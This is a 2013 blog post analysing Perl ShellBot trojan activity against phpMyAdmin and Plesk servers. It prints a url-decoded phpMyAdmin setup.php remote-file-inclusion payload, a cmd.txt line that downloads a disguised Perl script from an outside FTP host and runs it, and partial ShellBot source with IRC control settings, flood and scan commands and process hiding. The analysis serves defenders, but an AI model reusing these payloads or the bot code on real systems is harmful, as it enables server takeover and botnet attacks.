+++
title = 'Perl Shellbot.B trojan activity'
author = ['James Espinosa']
description = 'Analysis of Perl Shellbot.B malware activity.'
date = 2013-10-10T21:00:00-08:00
draft = false
tags = ['Malware Analysis', 'Reverse Engineering']
+++

This is probably not amazing news to many of you, since you probably see a lot of automated scanning and exploitation attempts on your network perimeter. Although a bit of old news by now, I thought I'd share anyway. About a week or two prior to [ISC Diary](https://isc.sans.edu/diary.html?date=2013-10-26) posting about this active threat, I had seen activity related to this Trojan on one of the systems that I have. The following is one of the many similar entries in my `access.log`:

```
85.17.234.16 - [18/Sep/2013:02:59:55 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 477 "-" "ZmEu"
```

This is obviously an automated scanner, which you've probably seen or continue to see on a daily basis. I didn't think much of it, but then I came across the following url-decoded entry:

```
POST /phpMyAdmin/scripts/setup.php HTTP/1.1
Host: x.x.x.x
Content-type: application/x-www-form-urlencoded
Connection: Close
User-Agent: Opera
Content-Length: 207

action=lay_navigation&eoltype=unix&token=&configuration=a:1:{i:0;O:10:"PMA_Config":1:{s:6:"source";s:38:"ftp[:]//web[:]12345@86.109.167.136/cmd[.]txt";}}
```

This is a known remote file inclusion attempt against `phpMyAdmin`, which you can read more about [here](http://blog.spiderlabs.com/2012/04/honeypot-alert-phpmyadmin-setupphp-rfi-attacks-detected.html). I was able to get a hold of two Perl scripts and the `cmd.txt` file for my analysis. Essentially, the two Perl scripts were what appeared to be a variant of the `Perl/ShellBot.A` Trojan. It's basically an IRC-based Trojan that allows an attacker to control the compromised servers through. It has capabilities the following capabilities:

- UDP flooding
- Nmap/basic port scanning
- File transferring through DCC
- Shell access

Here's what I found in the `cmd.txt` file:

```
system("cd /tmp;wget ftp[:]//web[:]12345@86.109.167.136/f.pdf;curl -O ftp[:]//web[:]12345@86.109.167.136/f.pdf;fetch ftp[:]//web[:]12345@86.109.167.136/f.pdf;perl f.pdf;perl f.pdf; rm -rf f.pdf*;rm -f /tmp/*pdf*");
```

If the above is successfully injected (it won't right? because you update your applications right?), it will download the `f.pdf` file, which is actually a Perl script that contains the ShellBot. I received two copies, `f.pdf` and `p.pdf`, targeting `phpMyAdmin`, and `Plesk` respectively. The following is a small snippet of the Perl script. Note, the only difference is the channel that the infected hosts join (@canais = channel in Portuguese) `#pma` and `#plesk`.

```perl
#!/usr/bin/perl
# ShellBOT
# 
# Comenzi:   !all
#          - @udp <ip> <port> <timp>;
#          - @fullportscan <ip> <start port> <final port>;
#          - !quit;
#          - !join <canal> <key> e !part <canal> <reason>;
#          - !op !deop !voice !devoice <canal> <nick>;
#          - !msg !ctcp 1 2;
#          - !invite <canal> <nick>;
#          - !nick <nick>;
#          - !rnick;
#          - !raw 1;

########## CONFIGURACAO ############
my $processo = '/usr/sbin/init.d';

$servidor='ircd.myz.info' unless $servidor;
my $porta='6667';
my @canais=("#pma");
my @adms=("X");
my @hostauth=("browsing.users.undernet.org");

# Anti Flood ( 6/3 Recomendado )
my $linas_max=6;
my $sleep=3;

my $nick = getnick();
my $ircname = getident2();
my $realname = "New Generation 2013";

my $acessoshell = 1;
######## Stealth ShellBot ##########
my $prefixo = "-";
my $estatisticas = 0;
my $pacotes = 1;
####################################

my $VERSAO = '0.2a';

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';

use IO::Socket;
use Socket;
use IO::Select;
chdir("/");
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0";
my $pid=fork;
exit if $pid;
die "mort: $!" unless defined($pid);

my %irc_servers;
my %DCC;
my $dcc_sel = new IO::Select->new();

#####################
# Stealth Shellbot  #
#####################

sub getnick {
  #my $retornonick = &_get("http://");
  #return $retornonick;
  return "pm".int(rand(1000));
}

# <-- snip -->
```

However, earlier last week, ISC Diary posted about a different variant of the ShellBot.B Trojan. According to them, it appears that it is targeting older Plesk vulnerabilities. You can read more about the details on their blog post [here](https://isc.sans.edu/diary.html?date=2013-10-26). Fortunately, I was able to snag a copy of that Perl script before the hosting server went offline. Much of it appears to be very similar to the previous versions that I talked about above. However, there are notable differences. Here's a sample snippet of that script:

```perl
#!/usr/bin/perl
my @mast3rs = ("pizza");

my @hostauth = ("sosick.net");
my @admchan=("#X");

my @server = ("89.248.172.144");
$servidor= $server[rand scalar @server] unless $servidor;

my $xeqt = "''";
my $homedir = "/tmp";
my $shellaccess = 1;
my $xstats = 1;
my $pacotes = 1;
my $linas_max = 5;
my $sleep = 6;
my $portime = 4;

my @fakeps = ("-bin");

my @nickname = ("LINUX");

my @xident = ("KAST");
my @xname = (`uname -a`);

#################
# Random Ports
#################
my @rports = ("6667");

my @Mrx = ("\001mIRC32 v5.91 K.Mardam-Bey\001","\001mIRC v6.2 Khaled Mardam-Bey\001",
   "\001mIRC v6.03 Khaled Mardam-Bey\001","\001mIRC v6.14 Khaled Mardam-Bey\001",
   "\001mIRC v6.15 Khaled Mardam-Bey\001","\001mIRC v6.16 Khaled Mardam-Bey\001",
   "\001mIRC v6.17 Khaled Mardam-Bey\001","\001mIRC v6.21 Khaled Mardam-Bey\001",
   "\001Snak for Macintosh 4.9.8 English\001",
   "\001DvC v0.1 PHP-5.1.1 based on Net_SmartIRC\001",
   "\001PIRCH98:WIN 95/98/WIN NT:1.0 (build 1.0.1.1190)\001",
   "\001xchat 2.6.2 Linux 2.6.18.5 [i686/2.67GHz]\001",
   "\001xchat:2.4.3:Linux 2.6.17-1.2142_FC4 [i686/2,00GHz]\001",
   "\001xchat:2.4.3:Linux 2.6.17-1.2142_FC4 [i686/1.70GHz]\001",
   "\001XChat-GNOME IRC Chat 0.16 Linux 2.6.20-8-generic [i686]\001",
   "\001ircN 7.27 + 7.0 - -\001","\001..(argon/1g) :bitchx-1.0c17\001",
   "\001ircN 8.00 ^_-^_ he tries to tell me what I put inside of me ^_-^_\001",
   "\001FreeBSD!4.11-STABLE bitchx-1.0c18 - prevail[0123] :down with people\001",
   "\001BitchX-1.0c19+ by panasync - Linux 2.4.31 : Keep it to yourself!\001",
   "\001BitchX-1.0c19+ by panasync - Linux 2.4.33.3 : Keep it to yourself!\001",
   "\001BitchX-1.1-final+ by panasync - Linux 2.6.18.1 : Keep it to yourself!\001",
   "\001BitchX-1.0c19 by panasync - freebsd 4.10-STABLE : Keep it to yourself!\001",
   "\001BitchX-1.1-final+ by panasync - FreeBSD 4.5-STABLE : Keep it to yourself!\001",
   "\001BitchX-1.1-final+ by panasync - FreeBSD 6.0-RELEASE : Keep it to yourself!\001",
   "\001BitchX-1.1-final+ by panasync - FreeBSD 5.3-RELEASE : Keep it to yourself!\001",
   "\001bitchx-1.0c18 :tunnelvision/1.2\001","\001PnP 4.22 - http://www.pairc.com/\001",
   "\001BitchX-1.0c17/FreeBSD 4.10-RELEASE:(c)rackrock/bX [3.0.1<C2>?9] : Keep it to yourself!\001",
   "\001P&P 4.22.2 (in development) + X Z P Bots, Sound, NickServ, ChanServ, Extras\001",
   "\001HydraIRC v0.3.148 (18/Jan/2005) by Dominic Clifton aka Hydra - #HydraIRC on EFNet\001",
   "\001irssi v0.8.10 - running on Linux i586\001","\001irssi v0.8.10 - running on FreeBSD i386\001",
   "\001ircII 20050423+ScrollZ 1.9.5 (19.12.2004)+Cdcc v1.6mods v1.0 by acidflash - Almost there\001",
   "\001ircII 20050423+ScrollZ 1.9.5 (19.12.2004)+Cdcc v1.8+OperMods v1.0 by acidflash - Almost there\001");

# Default quick scan ports
my @portas=("21","22","23","25","53","80","110","113","143","3306","4000","5900","6667","6668","6669","7000","10000","12345","31337","65501");

# xeQt

#my $nick = "Power";
my $nick = $nickname[rand scalar @nickname];
my $realname = $xname[rand scalar @xname];
my $ircname = $xident[rand scalar @xident];
my $porta = $rports[rand scalar @rports];
my $xproc = $fakeps[rand scalar @fakeps];
my $Mrx = $Mrx[rand scalar @Mrx];
my $version = 'PowerBots (C) GohacK';

$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';

# <-- snip -->
```

Obviously, the biggest takeaway from all of this is that you need to make sure that you're keeping your applications and servers patched. You will always get bombarded with scans and exploit attempts by automated scanners and malware. That's all I have, just thought I'd share! Stay safe out there.
